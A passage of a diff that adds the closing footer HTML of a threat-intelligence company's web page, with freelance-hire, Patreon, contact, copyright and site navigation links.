+        <a href="https://www.fiverr.com/users/bivashkumar007/seller_dashboard" target="_blank">Hire on Fiverr</a>
+        <a href="https://www.upwork.com/freelancers/~010d4dde1657fa5619" target="_blank">Hire on Upwork</a>
+        <a href="https://www.patreon.com/c/CYBERDUDEBIVASH" target="_blank">Support on Patreon</a>
+        <a href="mailto:bivash@cyberdudebivash.com">bivash@cyberdudebivash.com</a>
+      </div>
+    </div>
+    <div class="footer-bottom">
+      <span>&copy; 2026 <a href="https://www.cyberdudebivash.com" target="_blank">CyberDudeBivash Pvt. Ltd.</a> | <a href="../intelligence.html">Intelligence Hub</a> | <a href="../pricing.html">SOC Pro</a> | <a href="https://intel.cyberdudebivash.com" target="_blank">Sentinel APEX</a></span>
+      <span>Threat intelligence for authorized security professionals &mdash; <a href="https://github.com/cyberdudebivash" target="_blank">GitHub</a></span>
+    </div>
+  </div>
+</footer>
+
+</body>
+</html>
